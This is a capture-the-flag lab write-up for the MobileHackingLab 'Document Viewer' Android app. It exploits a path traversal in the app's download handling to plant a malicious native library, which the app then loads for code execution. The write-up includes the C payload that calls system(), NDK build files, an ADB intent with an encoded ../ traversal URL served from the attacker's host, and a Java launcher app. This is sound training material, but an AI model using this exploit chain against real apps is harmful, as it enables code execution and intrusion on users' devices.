**Description**: Welcome to the **Remote Code Execution** (RCE) Challenge! This lab provides a real-world scenario where you'll explore vulnerabilities in popular software. Your mission is to exploit a path traversal vulnerability combined with dynamic code loading to achieve remote code execution.

**Download**: https://lautarovculic.com/my_files/documentViewer.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-document-viewer-rce

![[documentViewer.png]]

Install the **APK** with **ADB**
```bash
adb install -r documentViewer.apk
```

The app appear ask for **storage permissions**.
Let's inspect the **source code** with **jadx** (GUI version)

And yes, here's the perms
```XML
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

This will give us a **button** that **load a PDF** file.
The **package name** is `com.mobilehackinglab.documentviewer`.

Here's the **key**, in the **MainActivity** class
```java
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
        this.proFeaturesEnabled = false;
    }
}
```

We can see that the app "can" load `libdocviewer_pro.so`- But, if we *decompile it* with **apktool**, we can't see any libraries.
Also, this will try load in the `native-libraries/` directory. This can will give us a **Path Traversal** attack.

The app can **handle** via **Intents** load `.PDF` files.
In the **AndroidManifest.xml** we can found the **MainActivity**
```XML
<activity
    android:name="com.mobilehackinglab.documentviewer.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

And, in logcat, if we try load some random pdf files we can see
```bash
12-31 05:42:13.609 25010 25010 E Companion: Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)
12-31 05:42:13.609 25010 25010 E Companion: java.lang.UnsatisfiedLinkError: dlopen failed: library "/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so" not found
```

So, we need **create our `libdocviewer_pro.so`** file!
As you already know, these libraries are written in C/C++
It mean that we can execute commands in the **sandbox app context**.

Notice that we have an **exported intent** in the **MainActivity**. So, we can send the **file** via ADB.
Here we can see how this **intent** is handled
```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
        CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.documentviewer.MainActivity$handleIntent$1
            /* JADX INFO: Access modifiers changed from: package-private */
            {
                super(1);
            }

            @Override // kotlin.jvm.functions.Function1
            public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                invoke2(uri);
                return Unit.INSTANCE;
            }

            /* renamed from: invoke, reason: avoid collision after fix types in other method */
            public final void invoke2(Uri uri) {
                MainActivity mainActivity = MainActivity.this;
                Intrinsics.checkNotNull(uri);
                mainActivity.renderPdf(uri);
            }
        }));
    }
}
```

Notice that the **`invoke2()`** method call to **`renderPDf()`** and take **uri** as argument.
Also, we have this line of code
```java
CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() {
```

There are a **CopyUtil** class.
Which is used when the *PDF* is read
```java
public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
    Intrinsics.checkNotNullParameter(uri, "uri");
    URL url = new URL(uri.toString());
    File file = CopyUtil.DOWNLOADS_DIRECTORY;
    String lastPathSegment = uri.getLastPathSegment();
    if (lastPathSegment == null) {
        lastPathSegment = "download.pdf";
    }
    File outFile = new File(file, lastPathSegment);
    MutableLiveData liveData = new MutableLiveData();
    BuildersKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
    return liveData;
}
```

And also
```java
public final MutableLiveData<Uri> copyFileFromAssets(Context context, String fileName) {
    Intrinsics.checkNotNullParameter(context, "context");
    Intrinsics.checkNotNullParameter(fileName, "fileName");
    AssetManager assetManager = context.getAssets();
    File outFile = new File(CopyUtil.DOWNLOADS_DIRECTORY, fileName);
    MutableLiveData liveData = new MutableLiveData();
    BuildersKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromAssets$1(outFile, assetManager, fileName, liveData, null), 2, null);
    return liveData;
}
```

This use the **`DOWNLOADS_DIRECTORY`** to copy the file.
Notice that there are a `MainActivity$onCreate$1` function.
What is that?
This is an **anonymous inner class automatically generated by the Java/Kotlin compiler** when there is an anonymous object (such as a *listener* or *callback*) defined within the `onCreate()` method of `MainActivity`.
Have, in stuff code, this piece:
```java
if (((Boolean) $result).booleanValue()) {
    CopyUtil.INSTANCE.copyFileFromAssets(mainActivity$onCreate$1.this$0, "dummy.pdf");
}
return Unit.INSTANCE;
```

In our device, we can notice this `dummy.pdf` file in `/sdcard/Downloads`

![[documentViewer2.png]]

All this information is useful to know if a **Path Traversal** attack is possible.
Due to `copyFileFromUri` function, we can notice that
```java
String lastPathSegment = uri.getLastPathSegment();
if (lastPathSegment == null) {
    lastPathSegment = "download.pdf";
}
File outFile = new File(file, lastPathSegment);
```
May be vulnerable.

We can try send the **intent** through **ADB**.
But, first set a *python server*
```bash
python3 -m http.server 8081
```
Then
```bash
adb shell am start \
-n com.mobilehackinglab.documentviewer/.MainActivity \
-a android.intent.action.VIEW \
-d "http://<ourHost>:<port>/<file>"
```
![[documentViewer3.png]]
Notice that the file `testDocumentViewer.txt` is in `/sdcard/Downloads` (Does not validate file type (.**PDF**)

After many tries, I got it
![[documentViewer4.png]]
We only had to send the coded request, in addition, **create the directories for the 200(OK) request**.
`/data/data/com.mobilehackinglab.documentviewer/files`
Then, we can see in the **device** we have the `.txt` file!
Path Traversal, check.

Now let's inspect the code for *native libraries*
```java
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
        this.proFeaturesEnabled = false;
    }
}
```

We can see that the library is loaded in `/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/`
Due to `sandboxAppDir/files + /native-libraries/ + abi (Application Binary Interface)`.
What is `abi`?
This defines **how an application's binary code interacts with the underlying operating system and CPU**. It is basically a contract that determines:

- How arguments are passed to functions.
- How values are returned.
- How memory and registers are organized.
- What type of instructions are available.

Android applications *may contain* native code (using **NDK**) that **depends directly on the ABI to run correctly on different CPU architectures**.
How get the `abi` from our device?
Just run with **ADB** this command
```bash
adb shell getprop ro.product.cpu.abi
```

When you compile native code using the **NDK** (**Native Development Kit**), you generate specific `.so` libraries (**Shared Object Files**) for each **ABI**.
```bash
lib/
├── armeabi-v7a/
│  ├── libnative-lib.so
├── arm64-v8a/
│  ├── libnative-lib.so
├── x86/
│  ├── libnative-lib.so
└── x86_64/
   └── libnative-lib.so
```
Operative system will select **automatically** the correct library.
- **armeabi-v7a**: 32-bit ARM CPU, efficient in power consumption, but limited in processing.
- **arm64-v8a**: 64-bit ARM CPU, can handle more memory and is faster.
- **x86 / x86_64**: More common in emulators and some Intel devices; less battery efficient.

Let's create our `.so` library!
We need install **Android NDK** (`ndk-build`)
Then, we need create the folders
```bash
mkdir -p jni libs obj
```
Must look like
```bash
📂 workDirectory/
├── 📂 jni/
│   ├── 📄 Android.mk
│   ├── 📄 Application.mk
│   ├── 📄 libdocviewer_pro.c
└── 📂 libs/
└── 📂 obj/
```

In `libdocviewer_pro.c`
```C
#include <jni.h>
#include <stdlib.h>
#include <android/log.h>

#define LOG_TAG "RCE-Payload"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

// RCE
JNIEXPORT void JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(JNIEnv* env, jobject /* this */) {
    LOGI("[+] Payload: initProFeatures");

    system("id > /data/data/com.mobilehackinglab.documentviewer/lautaro.txt");
    system("whoami > /data/data/com.mobilehackinglab.documentviewer/whoami.txt");
}

JNIEXPORT jstring JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_stringFromJNI(JNIEnv* env, jobject /* this */) {
    return (*env)->NewStringUTF(env, "Hello from native lib");
}
```

In `Android.mk`
```markdown
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE    := libdocviewer_pro
LOCAL_SRC_FILES := libdocviewer_pro.c
LOCAL_LDLIBS    := -llog
LOCAL_CFLAGS    := -std=c11

include $(BUILD_SHARED_LIBRARY)

```

In `Application.mk`
```markdown
APP_ABI := all
APP_PLATFORM := android-24
```

Compile it with
```bash
ndk-build clean && ndk-build
```

You must see an output like this
```bash
[arm64-v8a] Install        : libdocviewer_pro.so => libs/arm64-v8a/libdocviewer_pro.so
[riscv64] Install        : libdocviewer_pro.so => libs/riscv64/libdocviewer_pro.so
[x86_64] Install        : libdocviewer_pro.so => libs/x86_64/libdocviewer_pro.so
[armeabi-v7a] Install        : libdocviewer_pro.so => libs/armeabi-v7a/libdocviewer_pro.so
[x86] Install        : libdocviewer_pro.so => libs/x86/libdocviewer_pro.so
```

Then, update your work directory for host the `.so` file
```bash
/documentViewer/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a  ls
 .   ..   libdocviewer_pro.so
```

And, as the `.txt` we just need send it through a **intent**.
```bash
adb shell am start \
  -n com.mobilehackinglab.documentviewer/.MainActivity \
  -a android.intent.action.VIEW \
  -d "http://192.168.18.44:8081/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibdocviewer_pro.so"
```

![[documentViewer5.png]]

That work!
Here's a **Java code** if you prefer use an "malicious" app:
```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Uri uri = Uri.parse("http://<yourIP>:<port>/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2F<yourCPUABI>%2Flibdocviewer_pro.so");
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setClassName("com.mobilehackinglab.documentviewer", "com.mobilehackinglab.documentviewer.MainActivity");
        intent.setData(uri);
        startActivity(intent);
    }
}
```

I hope you found it useful (: